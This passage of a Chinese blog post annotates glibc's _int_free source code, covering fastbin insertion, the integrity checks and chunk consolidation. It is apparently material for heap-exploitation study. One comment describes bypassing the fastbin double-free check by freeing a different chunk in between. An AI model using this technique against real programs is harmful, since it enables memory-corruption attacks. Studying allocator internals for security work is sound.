class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free(mstate av, mchunkptr p, <span class="keyword">int</span> have_lock) &#123;</span><br><span class="line">    INTERNAL_SIZE_T size;      <span class="comment">/* its size */</span></span><br><span class="line">    mfastbinptr *   fb;        <span class="comment">/* associated fastbin */</span></span><br><span class="line">    mchunkptr       nextchunk; <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">    INTERNAL_SIZE_T nextsize;  <span class="comment">/* its size */</span></span><br><span class="line">    <span class="keyword">int</span>             nextinuse; <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">    INTERNAL_SIZE_T prevsize;  <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">    mchunkptr       bck;       <span class="comment">/* misc temp for linking */</span></span><br><span class="line">    mchunkptr       fwd;       <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span>         locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    size = chunksize(p);</span><br></pre></td></tr></table></figure><h3 id="简单的检查"><a href="#简单的检查" class="headerlink" title="简单的检查"></a>简单的检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">   allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">   Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">   here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="comment">// 指针不能指向非法的地址, 必须小于等于-size，为什么？？？</span></span><br><span class="line"><span class="comment">// 指针必须得对齐，2*SIZE_SZ 这个对齐得仔细想想</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>) ||</span><br><span class="line">    __builtin_expect(misaligned_chunk(p), <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">    malloc_printerr(check_action, errstr, chunk2mem(p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">   multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="comment">// 大小没有最小的chunk大，或者说，大小不是MALLOC_ALIGNMENT的整数倍</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检查该chunk是否处于使用状态，非调试状态下没有作用</span></span><br><span class="line">check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p)                                                    \</span></span><br><span class="line">    ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="line">     MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><h3 id="fast-bin-1"><a href="#fast-bin-1" class="headerlink" title="fast bin"></a>fast bin</h3><p>如果上述检查都合格的话，判断当前的 bin 是不是在 fast bin 范围内，在的话就插入到 <strong>fastbin 头部</strong>，即成为对应 fastbin 链表的<strong>第一个 free chunk</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">      and used quickly in malloc.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">      bordering top into fastbins</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="comment">//默认 #define TRIM_FASTBINS 0，因此默认情况下下面的语句不会执行</span></span><br><span class="line">       <span class="comment">// 如果当前chunk是fast chunk，并且下一个chunk是top chunk，则不能插入</span></span><br><span class="line">       <span class="comment">// 因为下一个chunk是topchunk 直接与 topchunk 合并</span></span><br><span class="line">        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            ) &#123;</span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能小于两倍的SIZE_SZ,并且</span></span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能大于system_mem， 一般为132k</span></span><br><span class="line">        <span class="comment">// 如果出现这样的情况，就报错。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(</span><br><span class="line">                chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">            __builtin_expect(</span><br><span class="line">                chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">/* We might not have a lock at this point and concurrent</span></span><br><span class="line"><span class="comment">               modifications</span></span><br><span class="line"><span class="comment">               of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">               after getting the lock.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">                    assert(locked == <span class="number">0</span>);</span><br><span class="line">                    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">                    locked = <span class="number">1</span>;</span><br><span class="line">                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ ||</span><br><span class="line">                        chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">                &#125;)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">                __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">                locked = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将chunk的mem部分全部设置为perturb_byte</span></span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">        <span class="comment">// 设置fast chunk的标记位</span></span><br><span class="line">        set_fastchunks(av);</span><br><span class="line">        <span class="comment">// 根据大小获取fast bin的索引</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">        <span class="comment">// 获取对应fastbin的头指针，被初始化后为NULL。</span></span><br><span class="line">        fb               = &amp;fastbin(av, idx);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">        <span class="comment">// 使用原子操作将P插入到链表中</span></span><br><span class="line">        mchunkptr    old     = *fb, old2;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">               add</span></span><br><span class="line"><span class="comment">               (i.e., double free).  */</span></span><br><span class="line">            <span class="comment">// so we can not double free one fastbin chunk</span></span><br><span class="line">            <span class="comment">// 防止对 fast bin double free</span></span><br><span class="line">            <span class="comment">// 防御方法是通过检查上一个chunk是否和新释放的chunk地址相同</span></span><br><span class="line">            <span class="comment">// 绕过方法就是在中间夹杂一个其他chunk，比如需要doublefree A，释放顺序为：</span></span><br><span class="line">            <span class="comment">// free A、free B、free A</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">               size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">               only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">               deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">                old_idx = fastbin_index(chunksize(old));</span><br><span class="line">            p-&gt;fd = old2 = old;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=</span><br><span class="line">                 old2);</span><br><span class="line">        <span class="comment">// 确保fast bin的加入前与加入后相同</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="合并非-mmap-的空闲-chunk"><a href="#合并非-mmap-的空闲-chunk" class="headerlink" title="合并非 mmap 的空闲 chunk"></a>合并非 mmap 的空闲 chunk</h3><p><strong>只有不是 fast bin 的情况下才会触发 unlink</strong></p><p>首先我们先说一下为什么会合并 chunk，这是为了避免 heap 中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为</p><ul><li>先考虑物理低地址空闲块</li><li>后考虑物理高地址空闲块</li></ul><p><strong>合并后的 chunk 指向合并的 chunk 的低地址。</strong></p><p>在没有锁的情况下，先获得锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">        __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br></pre></td></tr></table></figure><h4 id="轻量级的检测"><a href="#轻量级的检测" class="headerlink" title="轻量级的检测"></a>轻量级的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">   top block.  */</span></span><br><span class="line"><span class="comment">// 当前free的chunk不能是top chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当前free的chunk的下一个chunk不能超过arena的边界</span></span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;</span><br><span class="line">                         (<span class="keyword">char</span> *) nextchunk &gt;=</span><br><span class="line">                             ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)),</span><br><span class="line">                     <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当前要free的chunk的使用标记没有被标记，double free</span></span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 下一个chunk的大小</span></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="comment">// next chunk size valid check</span></span><br><span class="line"><span class="comment">// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者</span></span><br><span class="line"><span class="comment">// nextsize是否大于系统可提供的内存</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">    __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="释放填充"><a href="#释放填充" class="headerlink" title="释放填充"></a>释放填充</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将指针的mem部分全部设置为perturb_byte</span></span><br><span class="line">free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><h4 id="后向合并-合并低地址-chunk"><a href="#后向合并-合并低地址-chunk" class="headerlink" title="后向合并 - 合并低地址 chunk"></a>后向合并 - 合并低地址 chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="下一块不是-top-chunk-前向合并-合并高地址-chunk"><a href="#下一块不是-top-chunk-前向合并-合并高地址-chunk" class="headerlink" title="下一块不是 top chunk - 前向合并 - 合并高地址 chunk"></a>下一块不是 top chunk - 前向合并 - 合并高地址 chunk</h4><p>需要注意的是，如果下一块不是 top chunk ，则合并高地址的 chunk ，并将合并后的 chunk 放入到 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果下一个chunk不是top chunk</span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    <span class="comment">// 获取下一个 chunk 的使用状态</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">    <span class="comment">// 如果不在使用，合并，否则清空当前chunk的使用状态。</span></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">  Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">  not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">  been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 把 chunk 放在 unsorted chunk 链表的头部</span></span><br><span class="line">    <span class="comment">// unsorted bin 链头</span></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    <span class="comment">// unsorted bin 顺数第一个（最新放入）</span></span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="comment">// 简单的检查</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;fd = fwd;</span><br><span class="line">    p-&gt;bk = bck;</span><br><span class="line">    <span class="comment">// 如果是 large chunk，那就设置nextsize指针字段为NULL。</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bck-&gt;fd = p;</span><br><span class="line">    fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    set_foot(p, size);</span><br><span class="line"></span><br><span class="line">    check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="下一块是-top-chunk-合并到-top-chunk"><a href="#下一块是-top-chunk-合并到-top-chunk" class="headerlink" title="下一块是 top chunk - 合并到 top chunk"></a>下一块是 top chunk - 合并到 top chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="向系统返还内存"><a href="#向系统返还内存" class="headerlink" title="向系统返还内存"></a>向系统返还内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">          chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">          threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">          Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">          bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">          has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">          is reached.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">         <span class="comment">// 如果合并后的 chunk 的大小大于FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line">         <span class="comment">// 一般合并到 top chunk 都会执行这部分代码。</span></span><br><span class="line">         <span class="comment">// 那就向系统返还内存</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">            <span class="comment">// 如果有 fast chunk 就进行合并</span></span><br><span class="line">            <span class="keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// 主分配区</span></span><br><span class="line">            <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">                <span class="comment">// top chunk 大于当前的收缩阙值</span></span><br><span class="line">                <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (chunksize(av-&gt;top)) &gt;=</span><br><span class="line">                    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.trim_threshold))</span><br><span class="line">                    systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>      <span class="comment">// 非主分配区，则直接收缩heap</span></span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">                   large, because the corresponding heap might go away.  */</span></span><br><span class="line">                heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">                assert(heap-&gt;ar_ptr == av);</span><br><span class="line">                heap_trim(heap, mp_.top_pad);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">            assert(locked);</span><br><span class="line">            __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="释放-mmap-的-chunk"><a href="#释放-mmap-的-chunk" class="headerlink" title="释放 mmap 的 chunk"></a>释放 mmap 的 chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//  If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h2><h2 id="heap-trim"><a href="#heap-trim" class="headerlink" title="heap_trim"></a>heap_trim</h2><h2 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态链接程序利用</title>
      <link href="archives/21834a9f/"/>
      <url>archives/21834a9f/</url>
      
